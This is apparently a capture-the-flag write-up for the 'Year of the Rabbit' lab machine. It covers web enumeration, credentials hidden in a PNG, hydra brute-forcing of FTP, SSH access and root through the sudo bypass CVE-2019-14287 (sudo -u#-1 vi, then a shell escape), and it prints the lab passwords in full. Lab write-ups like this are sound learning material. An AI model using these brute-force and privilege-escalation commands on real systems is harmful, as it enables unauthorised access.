Year of the Rabbit — Writeup

# Reconnaissance
I started with reconnaissance. Scanned the target IP — port 21/tcp was open, running vsFTPd 3.0.2. First, I tried anonymous login — no luck. Then I switched to the web server.

## Web Enumeration
Directory brute-forcing only revealed /assets, but that was just a teaser. I noticed the page /sup3r_s3cr3t_fl4g.php behaved strangely: the browser was redirecting somewhere. I captured the response with curl -i and saw in the Location header the path /WExYY2Cv-qU/. I went there — it contained the file Hot_Babe.png.

## Extracting FTP Credentials from PNG
I tried binwalk — it found a zlib stream but couldn't extract it (typical for PNG). Then I used strings and filtered by keywords:

```bash
strings Hot_Babe.png | grep -i -E "ftp|password|user"
```
I got the line Username for FTP is ftpuser and a message that one of the passwords would work. I saved the password list to a file and ran hydra:
```bash
hydra -l ftpuser -P ftp_passwords.txt ftp://10.114.166.183 -V
```
The password 5iez1wGXKfPKQ worked.

## FTP Access
I logged into FTP and saw Eli's_Creds.txt. To avoid downloading, I read it directly in the terminal:
```bash
ftp> get Eli's_Creds.txt -
```
Inside was Brainfuck code. I copied it, decoded online — got the password for user eli.

## SSH Access as eli
Connected via SSH:

ssh eli@10.114.166.183
On login, the system showed a hint about a "s3cr3t hiding place". I found the directory:
```bash
find / -name s3cr3t 2>/dev/null
```
This led to /usr/games/s3cr3t/. There was a hidden file .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly! with the password for gwendoline: MniVCQVhQHUNI.

## Switching to gwendoline and User Flag
First I made a case mistake — su Gwendoline gave No passwd entry. Fixed to:

su gwendoline
Entered the password and read the user flag:
```bash
cat ~/user.txt
```
Privilege Escalation via sudo (CVE-2019-14287)
Next — sudo -l. I saw:
```bash
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
This means: you can run vi only for the specified file as any user except root. But there is vulnerability CVE-2019-14287 — bypassing !root via UID -1. First I mistakenly substituted root.txt instead of user.txt, and sudo rejected the request. Fixed the path:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

vi opened with root privileges. I pressed Esc, typed:

```bash
:!/bin/sh
```

— got a root shell.

Root Flag
Read the flag:

```bash
cat /root/root.txt
```

Machine pwned.
